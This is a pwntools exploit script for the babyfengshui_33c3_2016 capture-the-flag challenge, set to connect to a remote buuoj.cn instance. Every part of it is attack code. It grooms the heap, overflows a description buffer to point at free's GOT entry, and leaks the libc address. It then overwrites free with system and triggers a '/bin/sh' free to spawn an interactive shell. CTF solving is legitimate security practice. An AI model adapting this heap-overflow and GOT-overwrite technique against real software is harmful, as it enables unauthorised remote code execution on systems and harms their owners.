#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',26221)
#p = process('./babyfengshui_33c3_2016')
elf = ELF('./babyfengshui_33c3_2016')
context.log_level='debug'


def add_user(size, length, text):
    p.recvuntil('Action: ')
    p.sendline('0')
    p.recvuntil('size of description: ')
    p.sendline(str(size))
    p.recvuntil('name: ')
    p.sendline('railgun')
    p.recvuntil('text length: ')
    p.sendline(str(length))
    p.recvuntil('text: ')
    p.sendline(text)
def delete_user(index):
    p.recvuntil('Action: ')
    p.sendline('1')
    p.recvuntil('index: ')
    p.sendline(str(index))
def display_user(index):
    p.recvuntil('Action: ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(index))
def update_user(index, length, text):

    p.recvuntil('Action: ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('text length: ')
    p.sendline(str(length))
    p.recvuntil('text: ')
    p.sendline(text)

free_got = elf.got['free']

###leak libc###
add_user(0x80,0x80,'AAAA')#0
add_user(0x80,0x80,'BBBB')#1
add_user(0x8,0x8,'/bin/sh\x00')#2

delete_user(0)
offset = 0x80 + 0x88 + 0x88 + 0x8
#offset = 0x8d4f198 - (0x8d4f000 + 0x8) + 0x8
payload = 'A' * offset+ p32(free_got)
add_user(0x100,len(payload),payload)

display_user(1)
free = u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
libc = LibcSearcher('free',free)
libc_base = free - libc.dump('free')
system = libc_base + libc.dump('system')

payload = p64(system) + 'AAAA'
update_user(1,len(payload),payload)

###get shell###
delete_user(2)
p.interactive()

